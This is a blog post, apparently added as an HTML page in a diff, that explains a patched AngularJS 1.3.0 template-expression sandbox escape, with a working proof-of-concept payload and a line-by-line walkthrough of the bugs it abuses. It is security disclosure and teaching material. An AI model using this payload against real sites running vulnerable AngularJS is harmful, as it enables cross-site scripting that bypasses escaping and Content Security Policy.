@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Write your site description here. It will be used as your sites meta description as well!">
+
+    <title>An AngularJS Template Expression Sandbox Escape - Gábor Molnár</title>
+
+    
+    <link rel="canonical" href="https://gist.github.com/molnarg/5348cd4254cabc1d4f7b">
+    
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/clean-blog.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-1277369-13', 'auto');
+      ga('send', 'pageview');
+    </script>
+
+</head>
+
+
+<body>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Gábor Molnár</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="/">Home</a>
+                </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+    <!-- Post Header -->
+<header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>An AngularJS Template Expression Sandbox Escape</h1>
+                    
+                    <span class="meta">Posted by Gábor Molnár on November 9, 2014</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+				<h2>Short Proof of Concept</h2>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0/angular.js&quot;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">ng-app</span><span class="nt">&gt;</span>
+    {{
+    !ready <span class="err">&amp;&amp;</span> (ready = true) <span class="err">&amp;&amp;</span> (
+      !call
+      ? $$watchers[0].get(toString.constructor.prototype)
+      : (a = apply) <span class="err">&amp;&amp;</span>
+        (apply = constructor) <span class="err">&amp;&amp;</span>
+        (valueOf = call) <span class="err">&amp;&amp;</span>
+        (&#39;&#39;+&#39;&#39;.toString(
+          &#39;F = Function.prototype;&#39; +
+          &#39;F.apply = F.a;&#39; +
+          &#39;delete F.a;&#39; +
+          &#39;delete F.valueOf;&#39; +
+          &#39;alert(42);&#39;
+        ))
+    );
+    }}
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>
+<p>See also on jsfiddle <a href="http://jsfiddle.net/cm7n1ug4/3/">with HTML entities escaping</a> and <a href="http://jsfiddle.net/uesh50vo/">without escaping</a>.</p>
+
+<h2>AngularJS Template Expression Sandbox Escapes in General</h2>
+
+<p>AngularJS has a rich client side templating system that accepts JavaScript expressions wrapped in double curly braces (mustache style templating). The template code is interpreted by an interpreter written in JS itself, and prevents the template code from accessing the DOM, and sensitive objects and functions (<code>eval()</code>, <code>Function()</code>, <code>bind()</code>, <code>apply()</code>, <code>call()</code> etc.) that would allow arbitrary JS execution.</p>
+
+<p>Bugs in this sandbox mechanism can lead to XSS when mixing client side and server side templating like this:</p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">ng-app</span><span class="nt">&gt;</span>
+<span class="cp">&lt;?php echo $username; ?&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+</code></pre></div>
+<p>But why would you want to trick the sandboxing code when you can simply create a <code>&lt;script&gt;</code> tag just like in a regular XSS without much hassle? The answer is that you can bypass XSS protection mechanisms like these:</p>
+
+<ol>
+<li><code>&lt;?php echo htmlentities($username) ?&gt;</code> and <code>&lt;?php echo htmlspecialchars($username) ?&gt;</code> won&#39;t help this time. It prevents creating HTML tags, but the JS template code will be interpreted and sandbox escape will still work.</li>
+<li>It bypasses a strict <a href="https://developer.mozilla.org/en-US/docs/Web/Security/CSP">Content Security Policy</a> defined to prevent XSS attack. In this case, no <code>&lt;script&gt;</code> tags are created, the code is executed by Angular. </li>
+</ol>
+
+<p>See also: <a href="https://code.google.com/p/mustache-security/wiki/AngularJS#Sandbox_Bypasses">AngularJS sandbox escapes on the Mustache Security Wiki</a></p>
+
+<h2>Bugs Abused</h2>
+
+<p>The sandbox bypass abuses three bugs:</p>
+
+<ol>
+<li>It is possible to access the Function prototype as
+<code>toString.constructor.prototype</code>.</li>
+<li>The <code>$$watchers</code> array is exposed on the scope and this makes it possible
+to call the template recursively with a given new scope.</li>
+<li>When the scope is <code>Function.prototype</code>, <code>apply</code>, <code>bind</code> and <code>call</code> are
+all accessible and overwriteable (but not callable).</li>
+</ol>
+
+<p>(1) is actually not new and was used in previous sandbox escapes as well,
+but it seems like it was not fixed. I believe that (2) and (3) are new.</p>
+
+<h2>Detailed Explanation</h2>
+
+<p>The first line ensures that the expression evaluates at most once per scope.
+This is needed only to avoid the payload JS code from executing more than
+once.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">    !ready &amp;&amp; (ready = true) &amp;&amp; (
+</code></pre></div>
+<p>The whole payload will execute in two different contexts: first with the
+original one, and later with <code>Function.prototype</code>. The following conditional
+expression separates the code that should be executed in the main context
+and the other context. We assume that <code>call</code> is only defined in the function
+prototype context, so the main context code is the first branch and the
+function prototype code is the second branch.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">      !call
+      ? ...
+      : ...
+</code></pre></div>
+<p>The main context code runs first. It calls the template recursively with
+<code>Function.prototype</code> as context. It is made possible by the exposed
+<code>$$watchers[0].get</code> function which evaluates the current template with a
+given scope. <code>Function.prototype</code> is not accessible directly, but we can use
+<code>toString.constructor.prototype</code> instead.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">      ? $$watchers[0].get(toString.constructor.prototype)
+</code></pre></div>
+<p>The following lines evaluate only when the context is <code>Function.prototype</code>.
+The first line saves a reference to <code>apply</code> to temporary variable on the
+scope.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">      : (a = apply) &amp;&amp;
+</code></pre></div>
+<p>The next two lines is equivalent to <code>Function.prototype.apply = Function</code> and
+<code>Function.prototype.valueOf = Function.prototype.call</code>. These will be used
+for tricking Angular into instantiating and calling a function for us in the
+next step.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">        (apply = constructor) &amp;&amp;
+        (valueOf = call) &amp;&amp;
+</code></pre></div>
+<p>The following line first triggers the creation of a function with the code
+given as argument to the <code>toString</code> method and then calls the method:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">        (&#39;&#39;+&#39;&#39;.toString(&#39;js code&#39;))
+</code></pre></div>
+<p>When interpreting <code>&#39;&#39;.toString( ... )</code>, Angular actually uses <code>apply</code> to
+invoke the method. With this in mind, and considering the previously
+overwritten methods, the previous line is equivalent to these:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">        (&#39;&#39;+toString.apply(&#39;&#39;, [&#39;js code&#39;]))
+        (&#39;&#39;+Function.prototype.apply.call(toString, &#39;&#39;, [&#39;js code&#39;]))
+        (&#39;&#39;+Function(&#39;&#39;, [&#39;js code&#39;]))
+        (&#39;&#39;+Function(&#39;&#39;, &#39;js code&#39;))
+        (&#39;&#39;+function() { js code })
+</code></pre></div>
+<p>The newly created function will be converted to string because of the &#39;+&#39;
+operator, and as part of this process, the previously overwritten <code>valueOf</code>
+method is called:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">        (&#39;&#39;+function() { js code }.valueOf())
+        (&#39;&#39;+function() { js code }.call())
+        (&#39;&#39;+eval(&#39;js code&#39;))
+</code></pre></div>
+<p>The actual JS code first restores every change to the Function class:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">          &#39;F = Function.prototype;&#39; +
+          &#39;F.apply = F.a;&#39; +
+          &#39;delete F.a;&#39; +
+          &#39;delete F.valueOf;&#39; +
+</code></pre></div>
+<p>and the executes the main payload:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">          &#39;alert(42);&#39;
+</code></pre></div>
+<h2>Acknowledgements</h2>
+
+<p>Thanks for <a href="https://twitter.com/avlidienbrunn">Mathias Karlsson</a> for inspiring this work with his <a href="https://twitter.com/avlidienbrunn/status/513978256790663168">previous sandbox escape</a>, and the AngularJS team for quickly fixing the vulnerability. The fix has been released as part of <a href="https://github.com/angular/angular.js/blob/master/CHANGELOG.md#132-cardiovasculatory-magnification-2014-11-07">AngularJS 1.3.2</a>.</p>
+
+
+                <div id="disqus_thread" style="margin-top: 2em; margin-bottom: 2em;"></div>
+                <script type="text/javascript">
+                    /* * * CONFIGURATION VARIABLES * * */
+                    var disqus_shortname = 'gabor-molnar';
+                    
+                    /* * * DON'T EDIT BELOW THIS LINE * * */
+                    (function() {
+                        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                    })();
+                </script>
+                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/blog/2013/12/13/ucsb-ictf-2013-uranus/" data-toggle="tooltip" data-placement="top" title="UCSB iCTF 2013 - The Uranus service">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a href="https://twitter.com/molnar_g">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="https://www.facebook.com/mr.gabor.molnar">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="https://github.com/molnarg">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; Gábor Molnár 2015</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/clean-blog.min.js "></script>
+
+
+</body>
+
+</html>
